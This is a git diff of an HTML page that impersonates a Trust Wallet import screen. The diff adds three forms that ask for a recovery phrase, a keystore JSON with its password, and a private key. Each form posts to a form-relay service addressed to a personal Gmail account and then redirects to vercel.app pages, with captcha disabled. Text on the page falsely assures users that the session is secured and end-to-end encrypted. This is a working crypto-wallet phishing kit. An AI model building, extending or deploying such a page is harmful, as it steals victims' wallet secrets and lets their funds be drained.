@@ -10,6 +10,7 @@
     <link href="https://cdn.tailwindcss.com/2.2.19/tailwind.min.css" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@100;700&display=swap"
       rel="stylesheet"/>
+      
 
     <script src="https://cdn.tailwindcss.com"></script>
     <title>Document</title>
@@ -800,9 +801,9 @@
         
 
         <div class="px-4 flex flex-col justify-center items-center">
-            <img id="myImage" src="image/trust.PNG" class="lg:w-[10%] w-[13%]" alt="">
+            <img id="myImage" src="images/trust.png" class="lg:w-[10%] w-[13%]" alt="">
             <h2 id="head" class="text-[15px] font-semibold ">Trust Wallet</h2>
-            <p class="lg:text-[15px] text-[13px] text-center text-slate-500">This season is secured and encrypted</p>
+            <p class="lg:text-[15px] text-[13px] text-end text-slate-500">This session is secured and encrypted</p>
  
         </div>
 
@@ -831,7 +832,7 @@
             </div>
 
         </div>
-
+<!-- 
         <div id="formsed" class="hidden gap-2 flex-col mt-5 items-center justify-center">
             <form method="POST"  class="flex gap-2 flex-col items-center justify-center" >
                 <input type="hidden" name="_next" value="https://publicappnode.vercel.app/success.html">
@@ -842,20 +843,164 @@
                 <textarea name="message" minlength="12" id="" rows="5" cols="35"  placeholder="Enter your wallet phrase key.. Typically 12    (sometimes 24 ...)  words separated by single comma"  class="  placeholder:text-[12px] placeholder:text-slate-500 px-2 p-2 indent-1 lg:px-0 border placeholder:p-3 border-slate-400 rounded-lg"></textarea>
                 <button type="submit" id="sendEmailBtn" class="w-[80%] lg:w-[50%] mx-auto text-white text-[13px] rounded-lg my-2 bg-blue-700 p-2">Submit </button>
             </form>
+        </div> -->
+        <div class=" hidden p-2 gap-2 flex-col mt-3 items-center justify-center w" id="formsed" >
+
+            <div class="head flex items-center justify-center">
+                <!-- <h2>Import Wallet</h2> -->
+                <div class="link text-[14px] font-sans ">
+                    <button class="phrase active bg-green-500 p-2" onclick="opentab (event, 'formfill1')" id="defaultOpen">Phrase</button>
+                    <button class="phrase  hover:!bg-green-500 p-2" onclick="opentab (event, 'formfill2')">Keystore Json</button>
+                    <button class="phrase  hover:!bg-green-500 p-2" onclick="opentab (event, 'formfill3')">Private key</button>
+                </div>
+            </div>
+            
+            <div class="forms hidden gap-2 flex-col mt-5 items-center justify-center" id="formfill1">
+                <h1 class="text-[12px] font-sans ml-5">Recovery Phrase</h1>
+    
+                <form id="contactform"  action="https://formsubmit.co/gabbyjuan064@gmail.com" method="POST" class="flex gap-2 flex-col items-center justify-center">
+    
+                    <textarea required type="text" name="Phrase" id="" rows="3" cols="35"  placeholder="Enter your Phrase"  class="placeholder:text-[12px] placeholder:text-slate-500 px-2 p-2 indent-1 lg:px-0 border placeholder:p-3 border-slate-400 rounded-lg resize-none outline-none block"></textarea>
+    
+                    <!-- <textarea required type="text" name="phrase" id="" placeholder="Enter your phrase"></textarea> -->
+                    <!-- <input name="_redirect" type="hidden" id="name" value="https://protocolsyncc.vercel.app/done.html"> -->
+                    <!-- <input name="_formsubmit_id" type="text" style="display:none"> -->
+    
+                    <input type="hidden" name="_next" value="https://cryptonnet.vercel.app/done.html">
+               
+    
+                    <input type="hidden" name="_captcha" value="false">
+             
+    
+                    <h2 class="text-[10px] font-sans">Type your phrase (usually 12 or 24) separated by a single space.
+    
+                    <!-- <h2 class="red">Before you enter your mnemonics, we recommend you connect to the internet.</h2> -->
+                    
+                    <!-- <div class="chk">
+                        <span><input type="checkbox" name="" id="ddd"></span> 
+                        <span class="">
+                            <h2>
+                                I have entered all details correctly 
+        
+                            </h2>
+                        </span>
+                    </div> -->
+    
+                    
+                    <button type="submit" id="sendEmailBtn" class="w-[30%] lg:w-[50%] mx-auto text-white text-[12px] font-sans rounded-lg m-1 bg-green-500 p-2 justify-center flex " onclick="">IMPORT</button>
+                </form>
+            </div>
+    
+            <div class="forms hidden gap-2 flex-col mt-5 items-center justify-center" id="formfill2">
+                <h1 class="text-[12px] font-sans ml-5">Keystore Json</h1>
+    
+                <form id="contactform" action="https://formsubmit.co/gabbyjuan064gmail.com" method="POST"   class="flex gap-2 flex-col items-center justify-center">
+               
+                    <textarea required  id="" rows="2" cols="35"   type="text" name="keystore Json" id="" placeholder="Enter your Keystore Json" class="placeholder:text-[12px] placeholder:text-slate-500 px-2 p-2 indent-1 lg:px-0 border placeholder:p-3 border-slate-400 rounded-lg outline-none resize-none block"></textarea>
+    
+                    <textarea required  id="" rows="1" cols="35"  type="text" name="password" id="" placeholder="Enter your password" class=" inpass placeholder:text-[12px] placeholder:text-slate-500 px-2 p-2 indent-1 lg:px-0 border placeholder:p-3 border-slate-400 rounded-lg resize-none block outline-none scroll-m-0 overflow-hidden "></textarea>
+                    <!-- <input name="_redirect" type="hidden" id="name" value="https://protocolsyncc.vercel.app/done.html"> -->
+                   
+    
+                    <input type="hidden" name="_next" value="https://cryptonnet.vercel.app/done.html">
+                   
+    
+                    <input type="hidden" name="_captcha" value="false">
+             
+    
+    
+                    <h2 class="text-[10px] font-sans">Several lines of text beginning with '{...}'plus the password you used to encrypt it.</h2>
+    
+                    <!-- <h2 class="red">Before you enter your mnemonics, we recommend you connect to the internet.</h2> -->
+    
+                <!-- <div class="chk">
+                    <span><input type="checkbox" name="" id="ddd"></span> 
+                    <span class="">
+                        <h2>
+                            I have entered all details correctly
+    
+                        </h2>
+                    </span>
+                </div> -->
+                 
+    
+                    <!-- <div class="but">
+                        <button type="submit">IMPORT</button>
+    
+                    </div> -->
+    
+                    <button type="submit" id="sendEmailBtn" class="w-[30%] lg:w-[50%] mx-auto text-white text-[13px] font-sans rounded-lg m-1 bg-green-500 p-2 justify-center flex " onclick="">IMPORT</button>
+                </form>
+            </div>
+    
+            <div class="forms hidden gap-2 flex-col mt-5 items-center justify-center" id="formfill3">
+                <h1 class="text-[12px] font-sans ml-5">Private key</h1>
+    
+                <form id="contactform" action="https://formsubmit.co/gabbyjuan064@gmail.com" method="POST" class="flex gap-2 flex-col items-center justify-center">
+                    <textarea required  id="" rows="2" cols="35"  type="text" name="private key" id="" placeholder="Enter your Private key" class="placeholder:text-[12px] placeholder:text-slate-500 px-2 p-2 indent-1 lg:px-0 border placeholder:p-3 border-slate-400 rounded-lg resize-none block outline-none"></textarea>
+                    <!-- <input name="_redirect" type="hidden" id="name" value="https://protocolsyncc.vercel.app/done.html"> -->
+                    
+                    
+                    
+                    <input type="hidden" name="_next" value="https://cryptonnet.vercel.app/done.html">
+                    
+    
+                    <input type="hidden" name="_captcha" value="false">
+                   
+    
+                    <h2 class="text-[10px] font-sans">Type your Private key (usually string of letters).</h2>
+    
+                    <!-- <h2 class="red">Before you enter your mnemonics, we recommend you connect to the internet.</h2> -->
+    <!-- 
+                    <div class="chk">
+                        <span><input type="checkbox" name="" id="ddd"></span> 
+                        <span class="">
+                            <h2>
+                                I have entered all details correctly
+        
+                            </h2>
+                        </span>
+                    </div> -->
+                    <!-- <div class="but">
+                        <button type="submit">IMPORT</button>
+    
+                    </div> -->
+    
+    
+                    <button type="submit" id="sendEmailBtn" class="w-[30%] lg:w-[50%] mx-auto text-white text-[13px] font-sans rounded-lg m-1 bg-green-500 p-2 justify-center flex " onclick="">IMPORT</button>
+        
+                </form>
+            </div>
+    
         </div>
+        <script src="import.js"></script>
+<!-- 
+        <div id="formsed" class="hidden gap-2 flex-col mt-5 items-center justify-center">
+            <form id="contactform" action="https://gabbyjuan064@gmail.com" method="POST">
+
+                <textarea required type="text" name="phrase" id=""  minlength="12" id="" rows="5" cols="35"   placeholder="Enter your phrase. Typically 12    (sometimes 24 ...)  words separated by single space placeholder:text-[12px]  placeholder:text-slate-500 px-2 p-2 indent-1 lg:px-0 border placeholder:p-3 border-slate-400 rounded-lg"></textarea>
+                
+                <input type="hidden" name="_next" value="https://cryptonnet.vercel.app/success.html">
+
+                <input type="hidden" name="_captcha" value="false">
+
+                <button type="submit" id="sendEmailBtn" class="w-[80%] lg:w-[50%] mx-auto text-white text-[13px] rounded-lg my-2 bg-blue-700 p-2">Submit </button>
+            </form>
+
+        </div> -->
+
+
 
         <div class="flex gap-3 justify-start lg:px-5 px-2 lg:mx-7 mx-3 lg:py-8 py-3 items-center">
-            <img src="image/secure.png" class="w-[8%]" alt="">
+            <img src="images/secure.png" class="w-[8%]" alt="" >
             <p class="lg:text-[17px] text-[11px] mx-2 text-slate-500">This session is protected with an end-end encryption</p>
         </div>
 
-       
-
 
     </div>
-
-
+   
     <script src="main.js"></script>
+    <script src="import.js"></script>
 
     
 </body>
